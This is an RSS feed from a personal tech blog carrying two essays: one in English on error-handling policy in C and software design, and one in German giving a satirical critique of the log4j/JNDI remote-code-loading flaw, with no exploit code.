<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>security on Die wunderbare Welt von Isotopp</title>
    <link>https://blog.koehntopp.info/tags/security.html</link>
    <description>Recent content in security on Die wunderbare Welt von Isotopp</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 28 Jun 2022 15:13:56 +0000</lastBuildDate><atom:link href="https://blog.koehntopp.info/tags/security/feed.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Never check for an error condition you don&#39;t know how to handle</title>
      <link>https://blog.koehntopp.info/2022/01/10/never-check-for-an-error-condition.html</link>
      <pubDate>Mon, 10 Jan 2022 07:11:35 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2022/01/10/never-check-for-an-error-condition.html</guid>
      <description>&lt;p&gt;This is the english version of an &lt;a href=&#34;https://blog.koehntopp.info/2009/08/21/was-bedeutet-eigentlich-never-check-for-an-error-condition-you-don-t-know-how-to-handle.html&#34;&gt;older text in German&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Computer scientists are weird.
In their science there are a few rules that sound wrong when you hear them first, but make a lot of sense if you think about them.
Some of them are making sense even outside of computer science.&lt;/p&gt;
&lt;p&gt;One of those rules is&lt;/p&gt;
&lt;h1 id=&#34;never-check-for-an-error-condition-you-dont-know-how-to-handle&#34;&gt;
    &lt;a href=&#34;#never-check-for-an-error-condition-you-dont-know-how-to-handle&#34;&gt;
	Never check for an error condition you don&amp;rsquo;t know how to handle.
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;When you encounter this the first time that sounds very questionable.
There are known error conditions in my program that I know they can happen, and I should not check for them?&lt;/p&gt;
&lt;p&gt;If you read that left to right, that&amp;rsquo;s exactly what it means.
Let&amp;rsquo;s have a look at an example and try to understand what goes on.
Here is a very simple case: I could try to allocate memory from the operating system and that can fails.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;someSize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;what_now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That is a very typical situation.
For example, why does the library function &lt;code&gt;malloc()&lt;/code&gt; not check itself for &lt;code&gt;p == NULL&lt;/code&gt;  and handles this case?
Because it does not, I have to do that every time and must not forget that in a single case.&lt;/p&gt;
&lt;p&gt;Indeed, most programs have a function &lt;code&gt;safe_malloc()&lt;/code&gt;, which wraps &lt;code&gt;malloc()&lt;/code&gt; and more or less looks like the example above.
The point being that each program has their own implementation of &lt;code&gt; what_now()&lt;/code&gt;, because the desired behavior is specific to the application and cannot be provided by the library.&lt;/p&gt;
&lt;p&gt;One could argue that &lt;code&gt;malloc()&lt;/code&gt; should internally call a &lt;code&gt;what_now()&lt;/code&gt;, and each library user would have to provide an implementation for that.
But that would proscribe a certain mode of usage for &lt;code&gt;malloc()&lt;/code&gt;.
The solution that &lt;code&gt;malloc()&lt;/code&gt; does not do the check, but only signals the error, is the most flexible solution &amp;ndash; and hence suitable for a library function, because it leaves the choice to the user.
It provides mechanism, but not policy.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Side thought:&lt;/strong&gt; That&amp;rsquo;s one of the main differences between a library and a framework.
Libraries provide mechanism, but do not enforce a policy.
They do not proscribe a default way of working with problems.
Frameworks are opinionated, and have been designed with a specific way of working in mind, and provide policies that are considered default solutions in the context of the framework.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Side side though:&lt;/strong&gt; Kernel, libraries and frameworks are all infrastructure, and as all infrastructure they are being judged by how they fail.
In this case: What solutions exist to bypass the policy in a framework, if the policy does not fit.
&amp;ldquo;How can I have queries in &lt;a href=&#34;https://en.wikipedia.org/wiki/Ruby_on_Rails&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RoR&lt;/a&gt;

 that bypass &lt;a href=&#34;https://en.wikipedia.org/wiki/Active_record_pattern&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Active Record&lt;/a&gt;

&amp;rdquo; is one example.
How free of policy is this library?
Is it just a mechanism or is there an obvious or hidden intention, a policy?&lt;/p&gt;
&lt;p&gt;A library ideally supplies just a mechanism, but that makes it mandatory for the developer to think about a policy for error handling and how to implement it.
That&amp;rsquo;s a relatively obvious point, but one that in my experience is not taught sufficiently.
If it wasn&amp;rsquo;t, we&amp;rsquo;d have less bad code in many projects.
And I do not want to limit myself to the tons of toxic PHP-MYSQL that fire queries at a database without checking for errors at all.&lt;/p&gt;
&lt;p&gt;The point is rather that a missing policy for error handling requires that you provide one in the application (or at least some minimal standards in the application).
Some programming environments have a name for such an informal construct:
A convention, a contract between library developer and application developer that is informal and not enforced by the mechanisms of the language.
The convention is also often unspoken, or not made explicit enough in the documentation of the library.
And hence taught insufficiently, and then implemented insufficiently.&lt;/p&gt;
&lt;p&gt;But you can take the sentence&lt;/p&gt;
&lt;h1 id=&#34;never-check-for-an-error-condition-you-dont-know-how-to-handle-1&#34;&gt;
    &lt;a href=&#34;#never-check-for-an-error-condition-you-dont-know-how-to-handle-1&#34;&gt;
	Never check for an error condition you don&amp;rsquo;t know how to handle.
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;and read it backwards.
What exactly does it mean to handle an error condition?
Specifically, if the error happens, what are our options and what is the desired failure mode?
What is supposed to happen?&lt;/p&gt;
&lt;p&gt;Going back to the &lt;code&gt;malloc()&lt;/code&gt; above:
When that happens, the operating system can&amp;rsquo;t or won&amp;rsquo;t give us more memory.
We don&amp;rsquo;t know why, so we have to assume the worst.
That is: memory is full, nobody gets any memory any more.
In fact, there could be another program that permanently allocates more memory.
So even if we gave memory back to the operating system, we wouldn&amp;rsquo;t get it back when trying to reserve it.&lt;/p&gt;
&lt;p&gt;So handling this error means that we already have all memory required to recover from the situation before the error happens.
That&amp;rsquo;s a really complicated situation, and too complicated for most application developers when we force them to think about it.
At the point in time when this happens they are usually busy with completing the non-failing, actually function path of the application before they are ready to turn to failure modes and their code paths.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Side thought:&lt;/strong&gt; This is another main reason for bad code:
We force developers to think about failing code paths at the wrong point in time.
They really want to write programs that work well.
But we shouldn&amp;rsquo;t bother them with failure handling right when they are busy with completing the money earning part of the code.&lt;/p&gt;
&lt;p&gt;If we bother devs at the wrong moment in time, we get error handling like this at best:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;someSize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENOMEM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// out of memory error
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, at least they checked for an error.
Maybe there are even some &lt;code&gt; atexit(3)&lt;/code&gt; handlers stacked that will try to clean up, but did you ever see any of those?&lt;/p&gt;
&lt;p&gt;If you see code like this, it is screaming at you &amp;ldquo;Yes, yes, I know, but I am really busy now with other things. Go away!&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Another common problem is that we need to check for the error at the lowest level, but need more context at the higher levels of our code to handle it properly.
Sometimes there is not even a contract on how errors are being bubbled up to the next layer without losing information.
The interiors of the MySQL codebase used to be a prime example of that.
You could find code that mapped error codes similar to&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;errcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;doSomeThing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;errcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;E_THIS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;E_THAT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is taking detailed internal error codes and flattens them into larger categories, losing detail.
Sometimes a higher level handler has more context, but no longer sufficient detail to decide what exactly went wrong at the lower layers.&lt;/p&gt;
&lt;p&gt;The rule&lt;/p&gt;
&lt;h1 id=&#34;never-check-for-an-error-condition-you-dont-know-how-to-handle-2&#34;&gt;
    &lt;a href=&#34;#never-check-for-an-error-condition-you-dont-know-how-to-handle-2&#34;&gt;
	Never check for an error condition you don&amp;rsquo;t know how to handle.
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;means we need to discuss things.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Diagnosis:&lt;/strong&gt; Capture the error. Formulate a test which at some point in the code checks that we have a problem and distinctively signals which error that is.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Policy:&lt;/strong&gt; Determine the desired behavior for handling the error, that is, have a policy that explains how to handle the error.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Context:&lt;/strong&gt; Decide where in the stack the error can be handled best, or if we need to escalate. When we escalate, make sure an escalation is expected at the higher layer and check for their policy. They need to have one. Also make sure the escalation does not lose detail.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;this-is-useful-outside-of-computer-science&#34;&gt;
    &lt;a href=&#34;#this-is-useful-outside-of-computer-science&#34;&gt;
	This is useful outside of computer science.
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;The original trigger to write this article in 2009 was a discussion about a 911-button (110-Taste) in a web browser.
&amp;ldquo;If you see something, say something&amp;rdquo;: If you find web pages that contain things that may be relevant for law enforcement, have a way to call for help.&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s a very german and very 2009 idea, but suppose you want that: Coding that is easy, right? A button in a browser that raises an alarm somewhere should be very few lines of code in an extension.&lt;/p&gt;
&lt;p&gt;The real problem - and that is not a code problem - is the &lt;code&gt;what_now()&lt;/code&gt;.
What is supposed to happen with that alarm signal.
That&amp;rsquo;s a process question, that is &lt;strong&gt;WHO needs to talk WHEN with WHOM about WHAT?&lt;/strong&gt;
What information needs to be sent when the button is pressed and what reaction is then expected?&lt;/p&gt;
&lt;p&gt;Do we build a central emergency call center?
Do we transport location and identity information together with the call, if that is necessary?
If so, how?&lt;/p&gt;
&lt;p&gt;What other information is necessary to provide context?
The current URL?
The persistent state of the browser, with all bookmarks, the history and so on?
The volatile state of the browser, eg with all active spywat, but also all legit variables?
The whole state of the computer, processlist, memory and program information, installed software and so on?&lt;/p&gt;
&lt;p&gt;How is that call then handled and classified?&lt;/p&gt;
&lt;p&gt;What are standard reactions to verified and classfied emergency escalations?
Can the emergency call center take over the computer and extract further information and do a full forensic analysis?
Can they write and change the state of the machine to help?
Or can they just call back, and request a read-only screen sharing session to talk the user through the emergency?&lt;/p&gt;
&lt;p&gt;What taxonomy of emergencies do we build, and what are the required steps to verify a case?&lt;/p&gt;
&lt;p&gt;Do we plan for preventatice action, when we register a spike in incidents of a certain type (ie a computer virus outbreak)?
Do we have a problem management and change managent on top of our incident management that would want to and be able to prevent a large scale situation in the field?
In the case of an outbreak, for example, by forcing patches on all machines?&lt;/p&gt;
&lt;p&gt;How do we build the technical and legal framework for this?
How do we build the organisation for this?
How to we enforce the technical changes required to be able to do this?
Do we make the installation of some software mandatory to be able to be on the Internet?
How do we protect this infrastructure against abuse?&lt;/p&gt;
&lt;p&gt;The check was easy &amp;ndash; an emergency call button in a browser.&lt;/p&gt;
&lt;p&gt;The work is in the handling, which can be &amp;ldquo;somewhat involved&amp;rdquo;.
But these are details that are gracefully elided in the discussion when politicians demand such a button.
That&amp;rsquo;s providing quite simplicistic discussions:
Why do we not have such a button in every browser already?&lt;/p&gt;
&lt;p&gt;Can&amp;rsquo;t be that hard, right?&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Es funktioniert wie spezifiziert</title>
      <link>https://blog.koehntopp.info/2021/12/14/funktioniert-wie-spezifiziert.html</link>
      <pubDate>Tue, 14 Dec 2021 20:32:00 +0100</pubDate>
      
      <guid>https://blog.koehntopp.info/2021/12/14/funktioniert-wie-spezifiziert.html</guid>
      <description>&lt;p&gt;Dieser Artikel basiert auf
&lt;a href=&#34;https://twitter.com/isotopp/status/1470668771962638339&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;einem Twitter-Thread&lt;/a&gt;


und ist in deutscher Sprache als
&lt;a href=&#34;https://www.heise.de/meinung/Kommentar-zu-log4j-Es-funktioniert-wie-spezifiziert-6294476.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Heise Kommentar&lt;/a&gt;


erschienen.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Über den Java-Slogan &amp;ldquo;Write Once, Run Everywhere&amp;rdquo; wurden schon viele Witze gemacht.
Den log4j-Exploit behandeln viele nun wie einen Bug – das ist er nicht.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Eine kritische Lücke in der Java-Bibliothek Log4j beherrscht gerade die Schlagzeilen.
Die IT-Welt ruft &amp;ldquo;Warnstufe Rot&amp;rdquo; aus – weil offenbar der log4j-Code JNDI-Variablenexpansion vornehmen kann.
Doch was ist JNDI?
Jindi al Dap ist der Name eines alten arabischen Philosophen und Mathematik-Pioniers, der für Sun/Oracle gearbeitet hat, um &lt;a href=&#34;https://docs.oracle.com/javase/tutorial/jndi/overview/index.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ein System von Directory Lookups in Java&lt;/a&gt;

 zu entwickeln.
Dieses System lädt irgendwie Code aus dem Internet nach.
Aber selbst, wenn man länger auf das Systemdiagramm starrt, erkennt man nicht unbedingt sofort, an welcher Stelle sich der Java CLASSPATH so erweitert, dass er das gesamte Internet umfasst:&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/12/spezifiziert1.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;


&lt;em&gt;Systemdiagramm des JNDI Subsystems von Java, aus der &lt;a href=&#34;https://docs.oracle.com/javase/tutorial/jndi/overview/index.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Dokumentation&lt;/a&gt;

.&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;nichts-ist-jemals-simpel&#34;&gt;
    &lt;a href=&#34;#nichts-ist-jemals-simpel&#34;&gt;
	Nichts ist jemals simpel.
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Das ist so, weil in Java nichts jemals simpel ist.
Java Code ist unstrukturierter trockener Staub von Codefragmenten in Klassendateien, die inert in keiner Weise miteinander interagieren.
Erst mit den passenden Factories, Delegates, Generators und ClassLoaders werden sie instanziiert und zusammengesetzt.
Der entstehende Haufen an Querverweisen führt dann nur zufällig irgendwann einmal tatsächlich wirksamen Code aus. Man könnte jetzt auf die Idee kommen, eine IDE mit integrierter syntaktischer Codesuche zu verwenden, um diesen Quelltexthaufen in Form zu bringen und zu verstehen.
Aber das ist vergebens:
Auch mit der gesamten Codebasis und einem Index darauf kann man nicht vorhersagen, was eine gegebene Java Codebase tun wird, wenn man sie startet.&lt;/p&gt;
&lt;p&gt;Es braucht auch noch Konfigurationsdateien.
Diese sind ein weiterer Haufen &amp;ndash; Properties-Dateien &amp;ndash; in einem vorsintflutlichen Vorläufer von YAML geschrieben: XML.
Oder jedenfalls, das ist es, was wir denken sollen:
Mit den Properties und der Codebasis können wir endlich versuchen zu verstehen, was Java tut.
Und das wäre auch beinahe so, aber JNDI ist genau angetreten, dieses Problem zu beheben:
Directory Lookups!
Statt also die Anwendung und ihre Konfiguration zu paketieren, und dann die Pakete in Produktion zu installieren, können wir nun mit JNDI die Konfiguration vom Netz lesen.
Das heißt, die eigentlichen Konfigurationsdateien, die uns sagen, was die Anwendung tut sind&amp;hellip; nicht mehr da.
Fortschritt!&lt;/p&gt;
&lt;p&gt;Das stellt sicher, dass uns niemand mehr hacken kann, weil niemand den Code mehr versteht:
Wichtige, zum Verständnis der Codebasis notwendige Informationen sind versteckt in einem Verzeichnisdienst, und wir wissen nicht mal welcher.
Aber wir können das noch einen Schritt weiterspielen:
Der Code, der den Directory Lookup vornimmt, ist auch nicht da, nur ein Bootstrap:
&lt;a href=&#34;https://docs.oracle.com/javase/tutorial/jndi/overview/event&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Event and Service Provider Packages&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/12/spezifiziert2.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Laut &lt;a href=&#34;https://docs.oracle.com/javase/tutorial/jndi/overview/event&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Dokumentation&lt;/a&gt;

 können wir Objekte aus der Nameing API bekommen und dort hinein serialisieren. Wir bekommen also Printer-Objekte mit Printer-Methoden aus dieser API, wenn wir danach fragen.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Dank JDNI SPI können wir also Java Classfiles von einem LDAP-Server ausliefern lassen, die angeblich ein Printer-Object generieren, wenn wir nach einem Printer fragen &amp;ndash; dann aber stattdessen Doom installieren.
Oder einen Kryptominer oder Verschlüsselungstrojaner.
So geht Enterprise Security!&lt;/p&gt;
&lt;h2 id=&#34;write-once-run-everywhere&#34;&gt;
    &lt;a href=&#34;#write-once-run-everywhere&#34;&gt;
	Write Once, Run Everywhere!
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Der Java-Slogan ist ja &amp;ldquo;Write Once, Run Everywhere&amp;rdquo;.
Wir haben da viele Witze drüber gemacht, weil Java so oft gecrashed ist &amp;ndash; die meisten Java-Anwendungen liefern inzwischen ja die gesamte Ausführungsumgebung einschließlich der JRE mit, damit überhaupt etwas funktioniert.
Jetzt funktioniert endlich mal alles, und die Leute sind wieder unglücklich.
Aber im Ernst: Viele behandeln den log4j-Exploit wie einen Bug, einen Programmierfehler, eine Verletzung einer Spezifikation.
Genau das ist jedoch nicht der Fall:&lt;/p&gt;
&lt;p&gt;Es funktioniert &amp;ndash; wortwörtlich &amp;ndash; endlich einmal alles wie spezifiziert und dokumentiert:
All die Modularität und dynamische Erweiterbarkeit von Java hat ganz wunderbar und genau wie geplant zusammengearbeitet und funktioniert.
Darauf haben wir dekadenlang hingearbeitet!&lt;/p&gt;
&lt;h2 id=&#34;notabug-wontfix&#34;&gt;
    &lt;a href=&#34;#notabug-wontfix&#34;&gt;
	&amp;ldquo;NOTABUG, WONTFIX&amp;rdquo;
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Und das ist das eigentliche Problem hier.
Viele rufen jetzt nach &amp;ldquo;Mehr Kontrolle!&amp;rdquo;, &amp;ldquo;Mehr Review!&amp;rdquo;, &amp;ldquo;Mehr Funding!&amp;rdquo;, &amp;ldquo;Mehr Augen auf den Code!&amp;rdquo;.
Was wirklich helfen würde wäre weniger Code, weniger Indirektion und Boilerplate, und einfach mehr&amp;hellip; Einfachheit.&lt;/p&gt;
&lt;p&gt;Wieso brauche ich ein &lt;code&gt;LogAppenderFactorySingleton&lt;/code&gt;, das XML liest, um den Namen der Klasse zu bekommen, die es instanziieren muss, damit ich meine Logzeile da einwerfen kann, um sie asynchron an einen &lt;code&gt;LogStream&lt;/code&gt; anzuhängen?
Das ist nicht einfach.
Was ist einfach?
JSON nach stderr drucken.
Das ist einfach.
Aber Firmen stellen seit etwa einer Dekade Leute ein, die nicht wissen, was stdout und stderr sind und das ist irgendwie okay, weil inzwischen ja sowieso alles ein Webservices ist&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/12/spezifiziert4.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Ein totales log4shell Nonmention von &lt;a href=&#34;https://twitter.com/apenwarr/status/1469183890749558784&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;apenwarr&lt;/a&gt;

.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Softwareentwicklung ist viel moderner geworden:
Wir haben Merge Requests mit Code Review, CI/CD-Pipelines, Infrastructure as Code und Immutable Infrastructure.
Das nützt nur nix, wenn meine Java Logging Library &lt;a href=&#34;https://twitter.com/TheASF/status/1400875147163279374&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;auf dem Mars Code von Directory-Servern auf der Erde nachlädt&lt;/a&gt;

 und so das &amp;ldquo;Remote&amp;rdquo; in RCE komplett neu definiert.
Die Analyse von Dependencies hat nur dann Sinn, wenn die Liste dieser Abhängigkeiten endlich, und genau so immutable wie die Infrastruktur ist.&lt;/p&gt;
&lt;p&gt;Java hatte einmal die notwendigen Kontrollknöpfe, mit denen wir erzwingen konnten, dass diese Liste von Abhängigkeiten endlich und unveränderlich ist.
Wenn man auf diese Art von Lebensstil steht, gibt es etwas, das sich SM nennt: &lt;a href=&#34;https://docs.oracle.com/javase/tutorial/essential/environment/security.htmlOracle&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Oracle SM&lt;/a&gt;

.
SM bringt die notwendigen Verträge und die Disziplin, die eine Codebase braucht.
Aber die meisten Anwender stehen nicht auf SM, und lehnen die Idee ab.
Also wird die Funktionalität in Java 17 als deprecated (veraltet) gekennzeichnet und später entfernt werden (&lt;a href=&#34;https://openjdk.java.net/jeps/411&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;JEP 411: Deprecate the Security Manager for Removal&lt;/a&gt;

).&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/12/spezifiziert3.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;h2 id=&#34;wie-ein-dreijähriger&#34;&gt;
    &lt;a href=&#34;#wie-ein-dreij%c3%a4hriger&#34;&gt;
	Wie ein Dreijähriger
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Auch JNDI hat SM abgelehnt und hat ein promiskuitives Interface, das Code irgendwoher lädt und ausführt.
Man muss sich das wie einen Dreijährigen vorstellen, der sich jede Klasse in den Mund steckt, um herauszufinden wie sie schmeckt und ob sie sich ausführen lässt.
Das ist am Ende genau die Spezifikation:
Hier ist ein Object, deserialisiere es.
In Java bedeutet das, dass der Code für die Klasse des Objektes irgendwo her kommen muss, deren Methoden dann ausgeführt werden.&lt;/p&gt;
&lt;p&gt;Natürlich würde niemand das für eine gute Idee halten, wenn man es so formuliert.
